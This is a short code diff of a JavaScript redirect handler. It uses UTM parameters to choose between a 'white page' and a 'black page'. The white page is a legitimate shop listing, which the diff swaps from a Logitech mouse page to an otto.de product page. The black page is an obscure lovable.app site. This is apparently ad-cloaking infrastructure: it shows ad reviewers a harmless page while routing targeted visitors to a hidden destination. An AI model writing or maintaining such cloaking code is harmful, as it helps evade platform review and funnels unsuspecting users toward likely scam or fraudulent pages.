@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://logitech.onlinesalestore.pk/products/logitech-g102-gaming-mouse?variant=39548689711175";
+    const whitePageURL = "https://www.otto.de/p/sportikel24-huerde-x-fuss-huerdenset-mit-stange-180-cm-farbe-orange-leichte-montage-S0YE20OV/";
     const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
